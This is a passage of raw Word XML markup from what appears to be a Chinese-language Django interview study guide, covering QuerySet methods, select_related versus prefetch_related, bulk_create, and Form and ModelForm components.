        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">#&lt;10&gt; last():                返回最后一条记录 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB506D6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;11&gt; exists():              如果QuerySet包含数据，就返回True，否则返回False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4DD41768" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;12&gt; values(*field):        返回一个ValueQuerySet——一个特殊的QuerySet，运行后得到的并不是一系 model的实例化对象，而是一个可迭代的字典序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C92DE8D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;13&gt; values_list(*field):   它与values()非常相似，它返回的是一个元组序列，values返回的是一个字典序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35AFBEA4" w14:textId="48CB51A3" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#&lt;14&gt; distinct():            从返回结果中剔除重复纪录</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F740734" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>返回QuerySet对象的方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11451489" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      all()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2231798E" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      filter()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F10EF63" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      exclude()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BC88A6" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      order_by()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06D3206D" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      reverse()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8F9A16" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      distinct()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C172970" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">  特殊的QuerySet：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F9D99CE" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      values()       返回一个可迭代的字典序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C227828" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      values_list() 返回一个可迭代的元组序列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31688E58" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">  返回具体对象的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13298A75" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      get()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BB15EBB" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      first()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E8BF691" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      last()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7EC8DA" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">  返回布尔值的方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CEC4B87" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      exists()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401A6F75" w14:textId="77777777" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">  返回数字的方法有：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B07A5E5" w14:textId="01C69B6E" w:rsidR="00D92594" w:rsidRPr="00D92594" w:rsidRDefault="00D92594" w:rsidP="00D92594">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D92594">
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t xml:space="preserve">      count() </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="042020A6" w14:textId="26AAB722"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021</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>select_related</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>prefetch_related</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F9122C6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#有外键存在时，可以很好的减少数据库请求的次数,提高性能</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5DEFE5AD" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#select_related通过多表join关联查询,一次性获得所有数据,只执行一次SQL查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="764B7BB9" w14:textId="081D23E2" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>#prefetch_related分别查询每个表,然后根据它们之间的关系进行处理,执行两次查询</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48D650BB" w14:textId="60E98AA8"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022</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>filter</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>exclude</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25B136BD" w14:textId="15C8F3DC" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#取到的值都是QuerySet对象,filter选择满足条件的,exclude:排除满足条件的.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FA7179" w14:textId="3C189898"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024</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>values</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>values_list</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的区别？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60E00B44" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#values : 取字典的queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F81B771" w14:textId="5AA481D8" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#values_list : 取元组的queryset</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E671E46" w14:textId="177E6FF3"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025</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana" w:hint="eastAsia"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如何使用</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>django orm</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>批量创建数据？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5501546C" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#bulk_create()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F1089C7" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#objs=[models.Book(title="图书{}".format(i+15)) for i in range(100)]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E0D249B" w14:textId="4E785BA2" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#models.Book.objects.bulk_create(objs)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="49420C0D" w14:textId="334ED5B7"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026</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的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ModeForm</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>的作用？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05D51BFA" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#Form作用：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B9F03B6" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7E5E384D" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    1.在前端生成HTML代码</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7FA2E458" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    2.对数据作有效性校验</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="271F0645" w14:textId="77777777" w:rsidR="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#    3.返回校验信息并展示</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BCDC43A" w14:textId="65ABF127" w:rsidR="00325D76" w:rsidRPr="00325D76" w:rsidRDefault="00325D76" w:rsidP="00325D76">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="008000"/>
        </w:rPr>
        <w:t>#ModeForm：根据模型类生成From组件,并且可以操作数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1FEDE02E" w14:textId="4F2082F7"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027</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的</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Form</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>组件中</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>如果字段中包含</w:t>
      </w:r>
      <w:r w:rsidR="00325D76" w:rsidRPr="00325D76">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:hAnsi="Verdana"/>
          <w:color w:val="FFFFFF"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>choices</w:t>
      </w:r>
